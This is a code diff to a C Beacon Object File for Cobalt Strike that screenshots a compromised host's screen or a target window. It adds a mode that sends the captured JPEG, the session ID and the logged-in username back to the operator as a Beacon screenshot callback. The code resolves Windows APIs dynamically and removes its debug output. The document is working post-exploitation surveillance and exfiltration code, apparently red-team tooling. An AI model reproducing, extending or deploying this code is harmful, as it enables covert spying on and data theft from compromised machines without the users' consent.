@@ -3,16 +3,114 @@
 #include <stdlib.h>
 #include <time.h>
 #include "bofdefs.h"
-#include <gdiplus.h>    // Needed for GDI+ type definitions only
-
+#include <gdiplus.h>    
 
 #pragma comment(lib, "User32.lib")
 
-// Bring in the GDI+ types into the global namespace
+/*
+
+9/2/2025 update
+
+
+this line was the source of my hatred for MSVC and CobaltStrike for 2 days
+https://x.com/codex_tf2/status/1888504670269874667
+
+for whatever reason, adding the 
+```
 using namespace Gdiplus;
+```
+line caused MSVC to use COMDAT sections which Beacon for whatever reason doesnt handle well.
+But guess what? By sheer luck (and arguably slightly better handling), the TrustedSec COFFLoader
+was able to run the BOF just fine.
+
+So i had a fully working BOF that only worked in COFFLoader but not in Beacon for a whole day and a half.
+thx (and condolences) to all the unfortunate souls who looked at this error with me
+
+This single line is the cause of the migration from MSVC to mingw.
+
+CodeX
+*/
+using namespace Gdiplus;
+
+
+/*Download Screenshot*/
+void downloadScreenshot(char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) {
+// Function modified by @BinaryFaultline
+
+// This data helped me figure out the C code to download a screenshot. It was found in the BOF.NET code here: https://github.com/CCob/BOF.NET/blob/2da573a4a2a760b00e66cd051043aebb2cfd3182/managed/BOFNET/BeaconObject.cs
+// Special thanks to CCob doing the research around the BeaconOutput options, making this much easier for me.
+
+// private void WriteSessionUserNameTitle(BinaryWriter bw, int session, string userName, string title) {
+//             bw.Write(session);
+//             bw.Write(title.Length);
+//             bw.Write(Encoding.UTF8.GetBytes(title));
+//             bw.Write(userName.Length);
+//             bw.Write(Encoding.UTF8.GetBytes(userName));
+//         }
+
+// var screenshotCallback = new BinaryWriter(new MemoryStream());
+//             screenshotCallback.Write(jpgData.Length);
+//             screenshotCallback.Write(jpgData);
+//             WriteSessionUserNameTitle(screenshotCallback, session, userName, title);
+    int messageLength = 4 + jpgLen + 4 + 4 + titleLen + 4 + usernameLen;
+    char* packedData = (char*)MSVCRT$malloc(messageLength);
+
+    // //pack on jpgLen/fileSize as 4-byte int second
+    packedData[0] = jpgLen & 0xFF;
+    packedData[1] = (jpgLen >> 8) & 0xFF;
+    packedData[2] = (jpgLen >> 16) & 0xFF;
+    packedData[3] = (jpgLen >> 24) & 0xFF;
+
+    int packedIndex = 4;
+
+    // //pack on the bytes of jpg/returnData
+    for (int i = 0; i < jpgLen; i++) {
+        packedData[packedIndex] = jpg[i];
+        packedIndex++;
+    }
+    
+    //pack on session as 4-byte int first
+    packedData[packedIndex] = session & 0xFF;
+    packedData[packedIndex + 1] = (session >> 8) & 0xFF;
+    packedData[packedIndex + 2] = (session >> 16) & 0xFF;
+    packedData[packedIndex + 3] = (session >> 24) & 0xFF;
+
+    //pack on titleLength as 4-byte int second
+    packedData[packedIndex + 4] = titleLen & 0xFF;
+    packedData[packedIndex + 5] = (titleLen >> 8) & 0xFF;
+    packedData[packedIndex + 6] = (titleLen >> 16) & 0xFF;
+    packedData[packedIndex + 7] = (titleLen >> 24) & 0xFF;
+    
+    packedIndex += 8;
+
+    //pack on the bytes of title
+    for (int i = 0; i < titleLen; i++) {
+        packedData[packedIndex] = windowTitle[i];
+        packedIndex++;
+    }
+
+    //pack on userLength as 4-byte int second
+    packedData[packedIndex] = usernameLen & 0xFF;
+    packedData[packedIndex + 1] = (usernameLen >> 8) & 0xFF;
+    packedData[packedIndex + 2] = (usernameLen >> 16) & 0xFF;
+    packedData[packedIndex + 3] = (usernameLen >> 24) & 0xFF;
+    
+    packedIndex += 4;
+
+    //pack on the bytes of user
+    for (int i = 0; i < usernameLen; i++) {
+        packedData[packedIndex] = username[i];
+        packedIndex++;
+    }
+
+    BeaconOutput(CALLBACK_SCREENSHOT, packedData, messageLength);
+    return;
+}
 //-------------------------------------------------------------
-// Typedefs for the WinAPI functions (dynamically resolved)
+// Typedefs for the WinAPI functions
 //-------------------------------------------------------------
+typedef char* (__cdecl *PFN_getenv)(const char*);
+static PFN_getenv pgetenv = NULL;
 typedef HDC(WINAPI* PFN_CreateDCA)(LPCSTR, LPCSTR, LPCSTR, const DEVMODEA*);
 typedef int     (WINAPI* PFN_GetDeviceCaps)(HDC, int);
 typedef BOOL(WINAPI* PFN_DeleteDC)(HDC);
@@ -48,9 +146,11 @@ typedef HGDIOBJ(WINAPI* PFN_SelectPalette)(HDC, HPALETTE, BOOL);
 typedef UINT(WINAPI* PFN_RealizePalette)(HDC);
 typedef int     (WINAPI* PFN_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
 typedef BOOL(WINAPI* PFN_IsWindowVisible)(HWND);
+typedef DWORD (WINAPI* PFN_GetCurrentProcessId)(void);
+typedef BOOL (WINAPI* PFN_ProcessIdToSessionId)(DWORD dwProcessId, DWORD* pSessionId);
 
 //-------------------------------------------------------------
-// Declare static pointers for each WinAPI
+// init my func ptrs
 //-------------------------------------------------------------
 static PFN_CreateDCA              pCreateDC = NULL;
 static PFN_GetDeviceCaps          pGetDeviceCaps = NULL;
@@ -87,16 +187,19 @@ static PFN_SelectPalette          pSelectPalette = NULL;
 static PFN_RealizePalette         pRealizePalette = NULL;
 static PFN_GetDIBits              pGetDIBits = NULL;
 static PFN_IsWindowVisible        pIsWindowVisible = NULL;
+static PFN_GetCurrentProcessId    pGetCurrentProcessId = NULL;
+static PFN_ProcessIdToSessionId   pProcessIdToSessionId = NULL;
 
 //-------------------------------------------------------------
-// Dynamically resolve the required WinAPI functions
+// Dynamically resolve the required WinAPI functions because winapi limit :(
 //-------------------------------------------------------------
 void ResolveAPIs(void)
 {
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     HMODULE hUser32 = GetModuleHandleA("user32.dll");
     HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");
-
+    HMODULE hMSVCRT = GetModuleHandleA("msvcrt.dll");
+    pgetenv = (PFN_getenv)GetProcAddress(hMSVCRT, "getenv");
     pCreateDC = (PFN_CreateDCA)GetProcAddress(hGdi32, "CreateDCA");
     pGetDeviceCaps = (PFN_GetDeviceCaps)GetProcAddress(hGdi32, "GetDeviceCaps");
     pDeleteDC = (PFN_DeleteDC)GetProcAddress(hGdi32, "DeleteDC");
@@ -132,12 +235,13 @@ void ResolveAPIs(void)
     pRealizePalette = (PFN_RealizePalette)GetProcAddress(hGdi32, "RealizePalette");
     pGetDIBits = (PFN_GetDIBits)GetProcAddress(hGdi32, "GetDIBits");
     pIsWindowVisible = (PFN_IsWindowVisible)GetProcAddress(hUser32, "IsWindowVisible");
+    pGetCurrentProcessId = (PFN_GetCurrentProcessId)GetProcAddress(hKernel32, "GetCurrentProcessId");
+    pProcessIdToSessionId = (PFN_ProcessIdToSessionId)GetProcAddress(hKernel32, "ProcessIdToSessionId");
 
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Resolved hKernel32 to 0x%p", hKernel32);
 }
 
 //-------------------------------------------------------------
-// Dynamically resolve the required GDI+ functions
+// Dynamically resolve more GDI+ functions
 //-------------------------------------------------------------
 typedef Status(WINAPI* PFN_GdiplusStartup)(ULONG_PTR*, const GdiplusStartupInput*, GdiplusStartupOutput*);
 typedef VOID(WINAPI* PFN_GdiplusShutdown)(ULONG_PTR);
@@ -153,29 +257,18 @@ static PFN_GdipSaveImageToStream pGdipSaveImageToStream = NULL;
 
 void ResolveGdiPlus()
 {
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Resolving GDI+ functions...");
     HMODULE hGdiPlus = GetModuleHandleA("gdiplus.dll");
-
     hGdiPlus = LoadLibraryA("gdiplus.dll");
-
     pGdiplusStartup = (PFN_GdiplusStartup)GetProcAddress(hGdiPlus, "GdiplusStartup");
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] pGdiplusStartup: 0x%p", pGdiplusStartup);
-
     pGdiplusShutdown = (PFN_GdiplusShutdown)GetProcAddress(hGdiPlus, "GdiplusShutdown");
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] pGdiplusShutdown: 0x%p", pGdiplusShutdown);
-
     pGdipCreateBitmapFromHBITMAP = (PFN_GdipCreateBitmapFromHBITMAP)GetProcAddress(hGdiPlus, "GdipCreateBitmapFromHBITMAP");
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] pGdipCreateBitmapFromHBITMAP: 0x%p", pGdipCreateBitmapFromHBITMAP);
-
     pGdipDisposeImage = (PFN_GdipDisposeImage)GetProcAddress(hGdiPlus, "GdipDisposeImage");
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] pGdipDisposeImage: 0x%p", pGdipDisposeImage);
-
     pGdipSaveImageToStream = (PFN_GdipSaveImageToStream)GetProcAddress(hGdiPlus, "GdipSaveImageToStream");
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] pGdipSaveImageToStream: 0x%p\n", pGdipSaveImageToStream);
 }
 
 //-------------------------------------------------------------
-// Download file over Beacon (unchanged from your original code)
+// Download file over Beacon
+// credit: https://github.com/anthemtotheego/CredBandit/blob/e2e804a19a09003fa6a054a76f322adb32cd7adc/src/credBandit.c#L10
 //-------------------------------------------------------------
 void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
 {
@@ -266,7 +359,7 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
 
 //-------------------------------------------------------------
 // Convert the given HBITMAP to a JPEG in memory using GDI+
-// using our dynamically resolved functions
+// credit: https://github.com/WKL-Sec/HiddenDesktop/blob/14252f58e3f5379301f0d6334f92f8b96f321a16/client/scmain.c#L125
 //-------------------------------------------------------------
 BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSize)
 {
@@ -274,10 +367,9 @@ BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSi
     if (!pGdiplusStartup || !pGdiplusShutdown || !pGdipCreateBitmapFromHBITMAP ||
         !pGdipDisposeImage || !pGdipSaveImageToStream)
     {
-        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to resolve GDI+ functions");
         return FALSE;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Resolved GDI+ functions successfully");
+
 
     GdiplusStartupInput gdiplusStartupInput;
     gdiplusStartupInput.GdiplusVersion = 1;
@@ -286,13 +378,11 @@ BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSi
     gdiplusStartupInput.SuppressExternalCodecs = FALSE;
 
     ULONG_PTR gdiplusToken = 0;
-    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] We are about to call pGdiplusStartup...");
     Status stat = pGdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
     if (stat != Ok) {
         BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdiplusStartup failed: %d", stat);
         return FALSE;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] GdiplusStartup succeeded");
     GpBitmap* pGpBitmap = NULL;
     stat = pGdipCreateBitmapFromHBITMAP(hBitmap, NULL, &pGpBitmap);
     if (stat != Ok) {
@@ -300,7 +390,6 @@ BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSi
         pGdiplusShutdown(gdiplusToken);
         return FALSE;
     }
-    BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipCreateBitmapFromHBITMAP succeeded");
     IStream* pStream = NULL;
     if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK) {
         BeaconPrintf(CALLBACK_ERROR, "[DEBUG] CreateStreamOnHGlobal failed");
@@ -387,7 +476,7 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
     }
 
     if (savemethod == 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Saving JPEG to disk with filename %s", lpszFileName);
+        BeaconPrintf(CALLBACK_OUTPUT, "Saving JPEG to disk with filename %s", lpszFileName);
         HANDLE fh = pCreateFileA(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
         if (fh == INVALID_HANDLE_VALUE) {
@@ -398,9 +487,34 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
         pWriteFile(fh, (LPSTR)jpegData, jpegSize, &dwWritten, NULL);
         pCloseHandle(fh);
     }
-    else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Downloading JPEG over beacon with filename %s", lpszFileName);
+    else if (savemethod == 1) {
+        BeaconPrintf(CALLBACK_OUTPUT, "Downloading JPEG over beacon as a file with filename %s", lpszFileName);
         downloadFile((char*)lpszFileName, (int)strlen(lpszFileName), (char*)jpegData, (int)jpegSize);
+    }
+    else if (savemethod == 2) {
+        BeaconPrintf(CALLBACK_OUTPUT, "Downloading JPEG over beacon as a screenshot with filename %s", lpszFileName);
+        
+        DWORD session = -1;
+        if (pGetCurrentProcessId && pProcessIdToSessionId) {
+            pProcessIdToSessionId(pGetCurrentProcessId(), &session);
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to resolve GetCurrentProcessId or ProcessIdToSessionId");
+        }
+
+        char* user = (char*)pgetenv("USERNAME");
+        char title[] = "Screenshot";
+        int userLength = MSVCRT$_snprintf(NULL, 0, "%s", user);
+        int titleLength = MSVCRT$_snprintf(NULL, 0, "%s", title);
+
+        downloadScreenshot((char*)jpegData, (int)jpegSize,
+                           session,
+                           (char*)title, titleLength,
+                           (char*)user, userLength);
+    }
+    else {
+        BeaconPrintf(CALLBACK_ERROR, "Unknown savemethod specified: %d", savemethod);
+        free(jpegData);
+        return FALSE;
     }
 
     free(jpegData);
@@ -572,11 +686,11 @@ cleanup:
 // go:
 // BOF args:
 //   1. Filename 
-//   2. Save method: 0 = save to disk, 1 = download via Beacon.
+//   2. Save method: 0 = save to disk, 1 = download via Beacon, 2 = downloadScreenshot.
 //   3. PID: if nonzero, capture that window; if zero, capture the full screen.
 //-------------------------------------------------------------
 #ifdef BOF
-int debug = 1; // enable debugging prints
+int debug = 0; // enable debugging prints
 void go(char* buff, int len)
 {
     ResolveAPIs();  // Ensure API pointers are resolved
@@ -636,7 +750,7 @@ void go(char* buff, int len)
         if (!SaveHBITMAPToFile(hBitmap, filename, savemethod))
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to save JPEG");
         else
-            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Screenshot saved/downloaded as %s", filename);
+            BeaconPrintf(CALLBACK_OUTPUT, "Screenshot saved/downloaded successfully", filename);
         pDeleteObject(hBitmap);
     }
 }
